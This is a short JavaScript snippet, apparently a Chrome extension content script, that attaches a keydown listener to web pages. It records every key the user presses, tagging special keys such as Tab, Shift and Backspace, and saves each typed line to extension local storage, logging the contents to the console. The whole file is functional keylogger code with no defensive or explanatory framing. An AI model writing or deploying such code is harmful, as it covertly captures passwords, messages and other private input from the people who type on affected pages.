var input = '';
var items = {}, i = 0;
$(document).keydown(function(e){ 
  console.log(e.which);
  if (e.which == 13){
    console.log(input);
    items[i++] = input;
    chrome.storage.local.set(items);
    chrome.storage.local.get(null, function(result){console.log(result);});
    input = '';
  } else if (e.which === 9){
    input += '<tab>';
  } else if (e.which === 8){
    input += '<backspace>';
  } else if (e.which === 16){
    input += '<shift>';
  } else if (e.which === 17){
    input += '<ctrl>';
  } else if (e.which === 20){
    input += '<capslock>';
  } else {
    input += String.fromCharCode(e.which);
  }
});
